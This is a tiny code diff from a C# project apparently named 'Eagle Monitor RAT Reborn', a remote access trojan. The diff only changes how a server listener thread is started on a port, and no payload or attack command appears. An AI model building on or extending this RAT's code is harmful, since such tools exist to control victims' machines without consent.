@@ -202,8 +202,7 @@ namespace Eagle_Monitor_RAT_Reborn.Misc
             {
                 new Thread(() =>
                 {
-                    ServerHandler s = new ServerHandler();
-                    s.Listen(p);
+                    new ServerHandler(p);
                 }).Start();
             }
         }
